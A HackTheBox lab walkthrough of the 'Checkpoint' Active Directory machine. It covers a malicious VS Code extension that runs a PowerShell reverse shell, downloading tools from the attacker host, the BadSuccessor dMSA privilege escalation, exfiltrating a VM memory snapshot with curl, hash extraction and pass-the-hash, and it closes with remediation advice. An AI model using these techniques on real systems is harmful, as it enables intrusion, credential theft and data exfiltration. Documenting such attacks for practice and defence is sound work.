# HackTheBox — Checkpoint (Medium, Active Directory)

**Target IP:** `10.129.xx.xx`
**VPN/Attacker IP:** `10.10.xx.xx`
**Domain:** `checkpoint.htb`
**Domain Controller:** `DC01.checkpoint.htb`

---

## 1. Reconnaissance

### 1.1 Nmap Scan

```bash
nmap -sV -sC 10.129.xx.xx
```

```
Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-14 06:37 +0000
Nmap scan report for 10.129.xx.xx
Host is up (0.25s latency).
Not shown: 988 filtered tcp ports (no-response)
PORT     STATE SERVICE           VERSION
53/tcp   open  domain            Simple DNS Plus
88/tcp   open  kerberos-sec      Microsoft Windows Kerberos (server time: 2026-06-14 13:43:00Z)
135/tcp  open  msrpc             Microsoft Windows RPC
139/tcp  open  netbios-ssn       Microsoft Windows netbios-ssn
389/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: checkpoint.htb, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ldapssl?
3268/tcp open  ldap              Microsoft Windows Active Directory LDAP (Domain: checkpoint.htb, Site: Default-First-Site-Name)
3269/tcp open  globalcatLDAPssl?
5985/tcp open  http              Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled and required
|_clock-skew: 7h04m52s
| smb2-time:
|   date: 2026-06-14T13:43:46
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 133.53 seconds
```

The scan reveals a Windows domain controller (`DC01`) for the domain `checkpoint.htb`, running standard AD services (Kerberos, LDAP, SMB, WinRM via port 5985). A notable clock skew of ~7 hours is present, which will need to be handled later when working with Kerberos tickets.

### 1.2 Initial Credentials

A set of credentials was provided/obtained for the user `alex.turner`. Validating them against SMB:

```bash
nxc smb 10.129.xx.xx -u alex.turner -p 'Checkpoint2024!' --smb-timeout 10
```

```
SMB         10.129.xx.xx   445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:checkpoint.htb) (signing:True) (SMBv1:None)
SMB         10.129.xx.xx   445    DC01             [+] checkpoint.htb\alex.turner:Checkpoint2024!
```

Credentials are valid.

### 1.3 /etc/hosts Configuration

```bash
cat /etc/hosts
```

```
10.129.xx.xx   DC01.checkpoint.htb checkpoint.htb DC01

127.0.0.1       localhost
127.0.1.1       kali.kali       kali

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```

---

## 2. Active Directory Enumeration — Finding Writable Objects

Using `bloodyAD` to enumerate objects writable by `alex.turner`:

```bash
bloodyad -H 10.129.xx.xx -d checkpoint.htb -u alex.turner -p 'Checkpoint2024!' get writable
```

```
distinguishedName: CN=Deleted Objects,DC=checkpoint,DC=htb
DACL: WRITE

distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=checkpoint,DC=htb
permission: WRITE

distinguishedName: OU=Employees,DC=checkpoint,DC=htb
permission: CREATE_CHILD

distinguishedName: CN=Alex Turner,OU=Employees,DC=checkpoint,DC=htb
permission: WRITE

distinguishedName: CN=Mark Davies\0ADEL:2217e877-e2a2-47d7-91d4-99ede36f367e,CN=Deleted Objects,DC=checkpoint,DC=htb
permission: WRITE

distinguishedName: DC=checkpoint.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=checkpoint,DC=htb
permission: CREATE_CHILD

distinguishedName: DC=_msdcs.checkpoint.htb,CN=MicrosoftDNS,DC=ForestDnsZones,DC=checkpoint,DC=htb
permission: CREATE_CHILD
```

Key finding: `alex.turner` has **WRITE** permission over a **deleted** object — `Mark Davies` — sitting in the `Deleted Objects` container. This means the deleted user account can be **restored** (un-tombstoned).

### 2.1 Restoring the Deleted Object

```bash
bloodyad -H 10.129.xx.xx -d checkpoint.htb -u alex.turner -p 'Checkpoint2024!' set restore "CN=Mark Davies\0ADEL:2217e877-e2a2-47d7-91d4-99ede36f367e,CN=Deleted Objects,DC=checkpoint,DC=htb"
```

```
[+] CN=Mark Davies\0ADEL:2217e877-e2a2-47d7-91d4-99ede36f367e,CN=Deleted Objects,DC=checkpoint,DC=htb has been restored successfully under CN=Mark Davies,OU=Employees,DC=checkpoint,DC=htb
```

The `mark.davies` account is now restored into `OU=Employees`. Since AD-recycled objects retain most of their original attributes (including password hash in many cases, or here apparently the same password reused across the domain), we test the same password against this account.

---

## 3. Foothold via Restored Account & SMB Share

### 3.1 Validating mark.davies and Enumerating Shares

```bash
nxc smb 10.129.xx.xx -u mark.davies -p 'Checkpoint2024!' --smb-timeout 10 --shares
```

```
SMB         10.129.xx.xx   445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:checkpoint.htb) (signing:True) (SMBv1:None)
SMB         10.129.xx.xx   445    DC01             [+] checkpoint.htb\mark.davies:Checkpoint2024!
SMB         10.129.xx.xx   445    DC01             [*] Enumerated shares
SMB         10.129.xx.xx   445    DC01             Share           Permissions     Remark
SMB         10.129.xx.xx   445    DC01             -----           -----------     ------
SMB         10.129.xx.xx   445    DC01             ADMIN$                          Remote Admin
SMB         10.129.xx.xx   445    DC01             C$                              Default share
SMB         10.129.xx.xx   445    DC01             DevDrop         READ,WRITE      VS Code extensions share for approved .vsix packages compatible with VS Code engine 1.118.0
SMB         10.129.xx.xx   445    DC01             IPC$            READ            Remote IPC
SMB         10.129.xx.xx   445    DC01             NETLOGON        READ            Logon server share
SMB         10.129.xx.xx   445    DC01             SYSVOL          READ            Logon server share
SMB         10.129.xx.xx   445    DC01             VMBackups
```

The `mark.davies` credentials are valid, and reuse of the same password worked. Notably, the `DevDrop` share grants **READ/WRITE** and its description hints at an automated process that consumes `.vsix` (VS Code extension) packages — a strong indicator of a malicious extension upload vector.

### 3.2 Building a Malicious VS Code Extension (.vsix)

A `.vsix` package is essentially a zip archive. We craft one with a malicious `extension.js` that runs on activation.

**Directory layout:**
```
.
├── [Content_Types].xml
└── extension/
    ├── package.json
    └── extension.js
```

**`extension/package.json`:**
```json
{
  "name": "devtools-helper",
  "displayName": "DevTools Helper",
  "version": "1.0.0",
  "engines": {"vscode": "^1.118.0"},
  "activationEvents": ["*"],
  "main": "./extension.js",
  "contributes": {}
}
```

**`extension/extension.js`:**
```javascript
const cp = require('child_process');
exports.activate = function() {
    cp.exec('powershell -e <BASE64_ENCODED_REVERSE_SHELL_PAYLOAD>');
}
exports.deactivate = function() {}
```

> The base64 blob is a Base64/UTF-16LE encoded PowerShell reverse-shell one-liner (TCP reverse shell back to the attacker host on port 1234), executed via `powershell -e` (`-EncodedCommand`).

**`[Content_Types].xml`:**
```xml
<?xml version="1.0" encoding="utf-8"?>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
  <Default Extension="json" ContentType="application/json"/>
  <Default Extension="js" ContentType="application/javascript"/>
</Types>
```

**Packaging into `.vsix`:**
```bash
zip -r evil.vsix [Content_Types].xml extension/
```

```
  adding: [Content_Types].xml (deflated 36%)
  adding: extension/ (stored 0%)
  adding: extension/extension.js (deflated 53%)
  adding: extension/package.json (deflated 28%)
```

### 3.3 Setting Up a Listener and Uploading the Payload

Start a listener on the attacker machine:
```bash
nc -nlvp 1234
```

Upload the malicious `.vsix` to the writable `DevDrop` share:
```bash
impacket-smbclient mark.davies@checkpoint.htb
```
```
Password:
Type help for list of commands
# use DevDrop
# put evil.vsix
# ls
drw-rw-rw-          0  Sun Jun 14 14:03:33 2026 .
drw-rw-rw-          0  Sat May  9 14:42:27 2026 ..
-rw-rw-rw-       1685  Sun Jun 14 14:03:33 2026 evil.vsix
```

An automated backend process picks up the `.vsix` package and installs/loads it within VS Code, triggering our payload.

### 3.4 Catching the Shell

```
nc -nlvp 1234
listening on [any] 1234 ...
connect to [10.10.xx.xx] from (UNKNOWN) [10.129.xx.xx] 58532

PS C:\Program Files\Microsoft VS Code> whoami
checkpoint\ryan.brooks
```

We land a shell as `ryan.brooks`.

### 3.5 User Flag

```
PS C:\Users\ryan.brooks\Desktop> type user.txt
<REDACTED_USER_FLAG>
```

---

## 4. Privilege Escalation — BadSuccessor Attack

### 4.1 BloodHound Findings

Running BloodHound against the domain (using `ryan.brooks`'s session) reveals:

- `ryan.brooks` has **GenericWrite** over the service account `svc_deploy`.
- The domain is potentially vulnerable to the **BadSuccessor** attack (abuse of Windows Server 2025 delegated Managed Service Accounts / dMSA).

### 4.2 Confirming the OS Version

```powershell
PS C:\Users\ryan.brooks\Desktop> Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion'
```

```
SystemRoot                : C:\WINDOWS
BaseBuildRevisionNumber   : 32860
BuildBranch               : ge_release
BuildGUID                 : ffffffff-ffff-ffff-ffff-ffffffffffff
BuildLab                  : 26100.ge_release.240331-1435
BuildLabEx                : 26100.1.amd64fre.ge_release.240331-1435
CompositionEditionID      : ServerStandard
CurrentBuild              : 26100
CurrentBuildNumber        : 26100
CurrentMajorVersionNumber : 10
CurrentMinorVersionNumber : 0
CurrentType               : Multiprocessor Free
CurrentVersion            : 6.3
DisplayVersion            : 24H2
EditionID                 : ServerStandard
InstallationType          : Server
ProductName               : Windows Server 2025 Standard
ReleaseId                 : 2009
SoftwareType              : System
UBR                       : 32860
PathName                  : C:\WINDOWS
ProductId                 : 00493-00000-24846-AA789
```

Confirmed: **Windows Server 2025**, which introduces delegated Managed Service Accounts (dMSA) — the prerequisite for the BadSuccessor privilege escalation technique.

### 4.3 Requesting a Fake-Delegation TGT with Rubeus

To interact with AD via Kerberos (avoiding NTLM/clock-skew complications) we grab a TGT using Rubeus' `tgtdeleg`:

```powershell
PS C:\Users\ryan.brooks\Desktop> wget 10.10.xx.xx/Rubeus.exe -outfile R.exe
PS C:\Users\ryan.brooks\Desktop> ./R.exe tgtdeleg /nowrap
```

```
   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.3.3


[*] Action: Request Fake Delegation TGT (current user)

[*] No target SPN specified, attempting to build 'cifs/dc.domain.com'
[*] Initializing Kerberos GSS-API w/ fake delegation for target 'cifs/DC01.checkpoint.htb'
[+] Kerberos GSS-API initialization success!
[+] Delegation request success! AP-REQ delegation ticket is now in GSS-API output.
[*] Found the AP-REQ delegation ticket in the GSS-API output.
[*] Authenticator etype: aes256_cts_hmac_sha1
[*] Extracted the service ticket session key from the ticket cache: <SESSION_KEY_REDACTED>
[+] Successfully decrypted the authenticator
[*] base64(ticket.kirbi):

      <BASE64_KIRBI_TICKET_REDACTED>
```

### 4.4 Converting the Ticket for Linux Tooling

On the attacker (Kali) machine:

```bash
echo "<BASE64_KIRBI_TICKET_REDACTED>" | base64 -d > ryan.kirbi
```

```bash
impacket-ticketConverter ryan.kirbi ryan.ccache
```
```
[*] converting kirbi to ccache...
[+] done
```

```bash
export KRB5CCNAME=ryan.ccache
```

### 4.5 Confirming Writable Objects for ryan.brooks via Kerberos

```bash
bloodyad -H DC01.checkpoint.htb -i 10.129.xx.xx -d checkpoint.htb -u ryan.brooks -k get writable
```

```
Clock skew detected. Adjusting local time by 7:04:50.924164. Retrying operation.

distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=checkpoint,DC=htb
permission: WRITE

distinguishedName: OU=DMSAHolder,DC=checkpoint,DC=htb
permission: CREATE_CHILD

distinguishedName: CN=Ryan Brooks,OU=Employees,DC=checkpoint,DC=htb
permission: WRITE

distinguishedName: CN=svc_deploy,OU=ServiceAccounts,DC=checkpoint,DC=htb
permission: WRITE

distinguishedName: DC=checkpoint.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=checkpoint,DC=htb
permission: CREATE_CHILD

distinguishedName: DC=_msdcs.checkpoint.htb,CN=MicrosoftDNS,DC=ForestDnsZones,DC=checkpoint,DC=htb
permission: CREATE_CHILD
```

This confirms the two conditions required for **BadSuccessor**:
1. `CREATE_CHILD` rights on an OU (`OU=DMSAHolder`) — needed to create a new dMSA object.
2. `GENERIC WRITE` over a target principal (`svc_deploy`) — needed to set the dMSA's "predecessor" link so it inherits that principal's privileges.

### 4.6 Executing the BadSuccessor Attack with bloodyAD

```bash
bloodyad -u ryan.brooks -d checkpoint.htb -H DC01.checkpoint.htb -i 10.129.xx.xx -k ccache=ryan.ccache add badSuccessor evil_dmsa -t 'CN=svc_deploy,OU=ServiceAccounts,DC=checkpoint,DC=htb' --ou 'OU=DMSAHolder,DC=checkpoint,DC=htb'
```

```
Clock skew detected. Adjusting local time by 7:04:51.083975. Retrying operation.
[+] Creating DMSA evil_dmsa$ in OU=DMSAHolder,DC=checkpoint,DC=htb
[+] Impersonating: CN=svc_deploy,OU=ServiceAccounts,DC=checkpoint,DC=htb
Clock skew detected. Adjusting local time by 7:04:51.719856. Retrying operation.

Realm        : CHECKPOINT.HTB
Sname        : krbtgt/CHECKPOINT.HTB
UserName     : evil_dmsa$
UserRealm    : checkpoint.htb
StartTime    : 2026-06-14 14:35:18+00:00
EndTime      : 2026-06-15 00:30:57+00:00
RenewTill    : 2026-06-21 14:30:57+00:00
Flags        : enc-pa-rep, forwarded, renewable, forwardable, pre-authent
Keytype      : 18
Key          : <SESSION_KEY_REDACTED>
EncodedKirbi :

    <BASE64_KIRBI_TICKET_REDACTED>
[+] dMSA TGT stored in ccache file evil_dmsa_Ct.ccache

dMSA current keys found in TGS:
AES256: <REDACTED>
AES128: <REDACTED>
RC4: <REDACTED>

dMSA previous keys found in TGS (including keys of preceding managed accounts):
RC4: <REDACTED>
```

This abuses the dMSA "migration" feature in Windows Server 2025: by creating a new dMSA and pointing its `msDS-ManagedAccountPrecededByLink` (predecessor) attribute at `svc_deploy`, and since we have write rights on both the target OU and the target account, the KDC issues us a TGT for `evil_dmsa$` that **carries the group memberships and privileges of `svc_deploy`**, effectively granting us that account's access.

### 4.7 Using the New Ticket

```bash
export KRB5CCNAME=evil_dmsa_Ct.ccache
```

---

## 5. Lateral Movement — Accessing VMBackups Share

### 5.1 Configuring Kerberos on Kali

```bash
tail -n 8 /etc/krb5.conf
```
```
[realms]
 CHECKPOINT.HTB = {
  kdc = 10.129.xx.xx
  admin_server = 10.129.xx.xx
 }
[domain_realm]
 .checkpoint.htb = CHECKPOINT.HTB
 checkpoint.htb = CHECKPOINT.HTB
```

### 5.2 Browsing Shares with the dMSA Ticket

```bash
impacket-smbclient -k -no-pass DC01.checkpoint.htb
```

```
Type help for list of commands
# use VMBackups
# ls
drw-rw-rw-          0  Wed May 13 13:58:05 2026 .
drw-rw-rw-          0  Sat May  9 14:42:27 2026 ..
drw-rw-rw-          0  Wed May 13 13:58:18 2026 NightlyBackup_2024-11-01
# cd NightlyBackup_2024-11-01
# ls
drw-rw-rw-          0  Wed May 13 13:58:18 2026 .
drw-rw-rw-          0  Wed May 13 13:58:05 2026 ..
drw-rw-rw-          0  Wed May 13 13:58:18 2026 memory forensics
# cd memory forensics
# ls
drw-rw-rw-          0  Wed May 13 13:58:18 2026 .
drw-rw-rw-          0  Wed May 13 13:58:18 2026 ..
-rw-rw-rw-  106496000  Wed May 13 13:58:18 2026 Windows Server 2019-000001.vmdk
-rw-rw-rw- 2147483648  Wed May 13 13:58:18 2026 Windows Server 2019-Snapshot1.vmem
-rw-rw-rw-  138164859  Thu May 14 22:32:32 2026 Windows Server 2019-Snapshot1.vmsn
-rw-rw-rw-     270840  Wed May 13 13:58:18 2026 Windows Server 2019.nvram
-rw-rw-rw-       7642  Wed May 13 13:58:18 2026 Windows Server 2019.scoreboard
-rw-rw-rw- 10199695360  Wed May 13 13:58:18 2026 Windows Server 2019.vmdk
-rw-rw-rw-        502  Wed May 13 13:58:18 2026 Windows Server 2019.vmsd
-rw-rw-rw-       2749  Wed May 13 13:58:18 2026 Windows Server 2019.vmx
-rw-rw-rw-        274  Wed May 13 13:58:18 2026 Windows Server 2019.vmxf
# get Windows Server 2019-Snapshot1.vmem
```

> **Note:** Downloading a 2GB `.vmem` file directly via `impacket-smbclient` can be slow/unstable. An alternative is connecting via `evil-winrm` and uploading the file from the target to an attacker-hosted Python upload server.

### 5.3 Exfiltrating the Memory Snapshot via Evil-WinRM

Verify krb5 is configured correctly, then connect:

```bash
evil-winrm -i 10.129.xx.xx -r checkpoint.htb
```

```
Evil-WinRM shell v3.9

Warning: IP address detected (10.129.xx.xx). Kerberos requires FQDN. Do you want to attempt reverse DNS lookup?
Warning: Press "y" to attempt DNS resolution, press any other key to cancel

Info: Attempting reverse DNS lookup to get FQDN for Kerberos...
Info: Found FQDN(s) in /etc/hosts: DC01.checkpoint.htb, checkpoint.htb
Info: Multiple DNS names found: DC01.checkpoint.htb, checkpoint.htb. Selected: DC01.checkpoint.htb
[+] Resolved IP 10.129.xx.xx to FQDN: DC01.checkpoint.htb

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\evil_dmsa$\Documents> whoami /all
```

```
USER INFORMATION
----------------

User Name             SID
===================== ==============================================
checkpoint\evil_dmsa$ S-1-5-21-xxxxxxxxxx-xxxxxxxxxx-xxxxxxxxxx-7101


GROUP INFORMATION
-----------------

Group Name                                  Type             SID                                            Attributes
=========================================== ================ ============================================== ==================================================
CHECKPOINT\Domain Computers                 Group            S-1-5-21-xxxxxxxxxx-xxxxxxxxxx-xxxxxxxxxx-515  Mandatory group, Enabled by default, Enabled group
Everyone                                    Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                               Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users             Alias            S-1-5-32-580                                   Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2                                        Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization              Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group
CHECKPOINT\BackupAccess                     Group            S-1-5-21-xxxxxxxxxx-xxxxxxxxxx-xxxxxxxxxx-1123 Mandatory group, Enabled by default, Enabled group
CHECKPOINT\svc_deploy                       User             S-1-5-21-xxxxxxxxxx-xxxxxxxxxx-xxxxxxxxxx-1104 Mandatory group, Enabled by default, Enabled group
Authentication authority asserted identity  Well-known group S-1-18-1                                       Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

This confirms `evil_dmsa$` has inherited group membership from `svc_deploy`, notably **CHECKPOINT\BackupAccess**, granting access to the `VMBackups` share.

Start a Python upload server on the attacker host:

```bash
python3 -m uploadserver 8000
```
```
File upload available at /upload
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

Upload the memory snapshot from the target:

```powershell
*Evil-WinRM* PS C:\Shares\VMBackups\NightlyBackup_2024-11-01\memory forensics> curl.exe -F "files=@Windows Server 2019-Snapshot1.vmem" http://10.10.xx.xx:8000/upload
```

The upload completes (progress output omitted for brevity), and the file lands on the attacker machine:

```bash
ls -lah Windows\ Server\ 2019-Snapshot1.vmem
```
```
-rw-rw-r-- 1 kali kali 2.0G Jun 14 15:08 'Windows Server 2019-Snapshot1.vmem'
```

---

## 6. Memory Forensics — Extracting Administrator Hash

### 6.1 Using Volatility 3

```bash
python3 ~/volatility3/vol.py -f "Windows Server 2019-Snapshot1.vmem" windows.hashdump
```

```
Volatility 3 Framework 2.28.1
WARNING  volatility3.framework.layers.vmware: No metadata file found alongside VMEM file. A VMSS or VMSN file may be required to correctly process a VMEM file.

User    rid     lmhash  nthash

Administrator   500     aad3b435b51404eeaad3b435b51404ee        <REDACTED_NT_HASH>
Guest   501     aad3b435b51404eeaad3b435b51404ee        31d6cfe0d16ae931b73c59d7e0c089c0
DefaultAccount  503     aad3b435b51404eeaad3b435b51404ee        31d6cfe0d16ae931b73c59d7e0c089c0
WDAGUtilityAccount      504     aad3b435b51404eeaad3b435b51404ee        28f8d934dee90b2ec824351cb0844479
```

The `Administrator` NT hash is extracted from the memory dump of the backed-up VM.

### 6.2 Validating the Hash (Pass-the-Hash)

```bash
nxc winrm checkpoint.htb -u Administrator -H <REDACTED_NT_HASH>
```

```
WINRM       10.129.xx.xx   5985   DC01             [*] Windows 11 / Server 2025 Build 26100 (name:DC01) (domain:checkpoint.htb)
WINRM       10.129.xx.xx   5985   DC01             [+] checkpoint.htb\Administrator:<REDACTED_NT_HASH> (Pwn3d!)
```

The hash is valid for the **domain** Administrator account — confirming password/hash reuse between the old backed-up VM and the current domain.

---

## 7. Domain Administrator Access & Root Flag

### 7.1 Logging in as Administrator

```bash
evil-winrm -i checkpoint.htb -u Administrator -H <REDACTED_NT_HASH>
```

```
Evil-WinRM shell v3.9

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents>
```

### 7.2 Locating the Flag

The Administrator's Desktop did not contain the `root.txt` flag:

```powershell
*Evil-WinRM* PS C:\Users\Administrator\Desktop> dir
*Evil-WinRM* PS C:\Users\Administrator\Desktop>
```

During earlier enumeration, `max.palmer` was identified as a local administrator on the box. Checking that user's desktop:

```powershell
*Evil-WinRM* PS C:\Users\max.palmer\Desktop> type root.txt
<REDACTED_ROOT_FLAG>
```

---

## 8. Bonus — Full Credential Extraction with vmkatz

As an additional step, `vmkatz` (a Mimikatz-like tool for VMware memory/snapshot files) was used directly against the backup files to pull credentials without needing to download and process the full memory image locally.

```powershell
*Evil-WinRM* PS C:\Shares\VMBackups\NightlyBackup_2024-11-01\memory forensics> C:\Users\svc_deploy\Documents\n.exe "Windows Server 2019-Snapshot1.vmsn"
```

```
[*] vmkatz v1.4.1
[*] System discovery: 11.2469877s
[*] Process enumeration: 2.8974ms
[*] Providers: MSV(ok) WDigest(ok) Kerberos(ok) TsPkg(empty) DPAPI(ok) SSP(empty) LiveSSP(n/a) Credman(empty) CloudAP(empty)
[*] Credential extraction: 72.663ms
[+] 2 logon session(s), 2 with credentials:

  LUID: 0x3e4 (NETWORK SERVICE)
  Username: WIN-0DG6SJAEUTA$
  Domain: WORKGROUP
  [DPAPI]
    GUID          : 632b77c8-5e1a-4479-8e35-baa290fdd6ae
    MasterKey     : <REDACTED>
    SHA1 MasterKey: <REDACTED>
  [DPAPI]
    GUID          : 57e1a5d6-bbd4-44e9-a5c4-f4241b0821b0
    MasterKey     : <REDACTED>
    SHA1 MasterKey: <REDACTED>
  [DPAPI]
    GUID          : 4f09a449-22e7-4a65-a4b9-fac89cc25328
    MasterKey     : <REDACTED>
    SHA1 MasterKey: <REDACTED>

  LUID: 0x14016d
  Session: 2 | LogonType: Unknown
  Username: Administrator
  Domain: WIN-0DG6SJAEUTA
  LogonServer: WIN-0DG6SJAEUTA
  LogonTime: 2026-05-09 14:07:14 UTC
  SID: S-1-5-21-xxxxxxxxxx-xxxxxxxxxx-xxxxxxxxxx-500
  [MSV1_0]
    NT Hash : <REDACTED_NT_HASH>
    SHA1    : <REDACTED>
    DPAPI   : <REDACTED>
  [DPAPI]
    GUID          : c53f7d5b-2902-415c-9c09-251f39974440
    MasterKey     : <REDACTED>
    SHA1 MasterKey: <REDACTED>
```

Running it against the `.vmem` file as well produced the same set of credentials, confirming the extracted NT hash for `Administrator` matches what was independently pulled via Volatility 3.

---

## 9. Attack Chain Summary

| Step | Technique | Result |
|------|-----------|--------|
| 1 | Initial creds for `alex.turner` | SMB access confirmed |
| 2 | AD ACL abuse — restore deleted object (`Mark Davies`) via WRITE on Deleted Objects | Recovered `mark.davies` account |
| 3 | Password reuse | Valid creds for `mark.davies` |
| 4 | Abused writable `DevDrop` SMB share — uploaded malicious `.vsix` (VS Code extension) | Code execution as `ryan.brooks` |
| 5 | BloodHound enumeration | Found GenericWrite on `svc_deploy` + CREATE_CHILD on `OU=DMSAHolder` |
| 6 | **BadSuccessor** attack (Windows Server 2025 dMSA abuse) via bloodyAD | Obtained TGT inheriting `svc_deploy`'s privileges (incl. `BackupAccess` group) |
| 7 | Accessed `VMBackups` share | Found VM snapshot/memory files of an old DC |
| 8 | Memory forensics (Volatility3 / vmkatz) on `.vmem`/`.vmsn` | Extracted domain Administrator NT hash |
| 9 | Pass-the-Hash | Domain Administrator access via WinRM |
| 10 | Flag located in `max.palmer`'s Desktop | Root flag captured |

---

## 10. Tools Used

- `nmap` — port/service scanning
- `nxc` (NetExec) — SMB/WinRM credential validation and share enumeration
- `bloodyAD` — AD object enumeration and write-based exploitation (restore, BadSuccessor)
- `BloodHound` — AD attack path analysis
- `impacket` (`smbclient`, `ticketConverter`) — SMB interaction and Kerberos ticket conversion
- `Rubeus` — Kerberos TGT delegation/extraction
- `evil-winrm` — WinRM shell access
- `uploadserver` (Python) — file exfiltration from target
- `Volatility 3` — memory forensics / hashdump
- `vmkatz` — VMware memory/snapshot credential extraction

---

## 11. Key Takeaways / Remediation

1. **Deleted Object ACLs:** Overly permissive WRITE rights on the `Deleted Objects` container allow attackers to "resurrect" disabled/deleted accounts, especially dangerous when combined with password reuse.
2. **Password Reuse:** Multiple accounts (`alex.turner`, `mark.davies`, and the old backed-up VM's `Administrator`) shared identical/recycled passwords or hashes — a major systemic weakness.
3. **Unrestricted Write Shares:** The `DevDrop` share, intended for automated `.vsix` deployment, allowed arbitrary write access and lacked validation of uploaded packages, enabling RCE.
4. **BadSuccessor (dMSA abuse):** On Windows Server 2025, any principal with `CREATE_CHILD` on an OU and `GenericWrite`/`GenericAll` on a target account can create a dMSA that inherits that account's privileges — equivalent to a full account takeover. This should be tightly restricted via delegation review.
5. **Stale Backups with Live Credentials:** Old VM backups containing memory dumps of decommissioned domain controllers retained valid (still-active) Administrator credentials, illustrating the danger of insecure backup storage and infrequent credential rotation.

---
